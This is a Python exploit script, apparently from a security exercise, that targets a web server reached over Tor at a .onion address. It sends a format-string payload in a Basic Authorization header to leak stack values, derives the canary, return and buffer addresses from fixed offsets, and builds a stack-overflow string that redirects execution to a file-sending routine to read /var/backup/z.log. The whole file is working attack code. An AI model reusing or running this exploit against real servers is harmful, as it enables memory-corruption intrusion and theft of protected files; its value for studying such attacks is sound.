import requests
import requests_tor
from requests_tor import RequestsTor
import os

rt = RequestsTor() #for Tor Browser
rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Tor

#rt = requests #To run the attack locally, comment out the first two lines about Tor and uncomment this line here.

url = 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/'
#url = 'http://127.0.0.1:8000/' #Also uncomment this for local attacks. And comment out the line above.
headers={
    "Host":"zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":"en-US,en;q=0.5",
    "Accept-Encoding":"gzip, deflate",
    "Authorization":"Basic JXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXguJXg6",
    "Connection":"keep-alive",
    "Upgrade-Insecure-Requests":"1",    
    "Cache-Control":"max-age=0",
    "Content-Length": "10"
    }

#Getting the information leak from format string parameter exploit using the headers above. Authorization consists of the string %x. repeated 31 times (in base64 encoded format).
r = rt.get(url, headers=headers)
header_data = r.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-5:]#The last five values are the ones we need.
#print(header_data)

#Getting return address, ebp and canary (replacing the 00 with 26(ascii of '&')).
ret_addr = header_data[-1]
ebp = header_data[-2]
canary = header_data[0].replace('00', '26')

#Offset of 1625 bytes ahead (sic) is the address of send_file call.
ret_hex = int(ret_addr, base = 16) + 1625
ret_addr = hex(ret_hex)[2:]

#Offset of 232 bytes behind (sic) the ebp is the canary address.
canary_addr = int(ebp, base=16) - 232
canary_addr = hex(canary_addr)[2:].replace('00', '04')#Some executions have 00 at the end of the canary address, so we replace it with 04 here (sic)

#Offset of 232 bytes behind (sic) the ebp is the buffer address.
buffer_addr = int(ebp, base=16) - 232
buffer_addr = hex(buffer_addr)[2:]

#Text payload is the path of z.log and some 26's (ascii of &) needed for alignment. (sic for other files?)
text_payload_1 = "/var/backup/z.log&&&"
text_payload_1 = ''.join(hex(ord(x))[2:] for x in text_payload_1)

#Some executions have 00 at the end of the return address, so we replace it with 26 here (it will be replaced by 00 by the for loop anyway).
ret_addr = ret_addr.replace('00', '26')

#Reversing by two bytes the values we have (because of little endianness).
ret_addr = "".join(reversed([r'\x' + ret_addr[i:i+2] for i in range(0, len(ret_addr), 2)]))
canary_addr = "".join(reversed([r'\x' + canary_addr[i:i+2] for i in range(0, len(canary_addr), 2)]))
canary = "".join(reversed([r'\x' + canary[i:i+2] for i in range(0, len(canary), 2)]))
buffer_addr = "".join(reversed([r'\x' + buffer_addr[i:i+2] for i in range(0, len(buffer_addr), 2)]))
text_payload_1 = "".join(([r'\x' + text_payload_1[i:i+2] for i in range(0, len(text_payload_1), 2)]))


#Building the attack string.
attack_str = ''
attack_str += text_payload_1

for i in range(0, 10):
    attack_str += canary_addr

for i in range(0, 4):
    attack_str += canary

attack_str += ret_addr

for i in range(0, 2):
    attack_str += buffer_addr

print(attack_str)


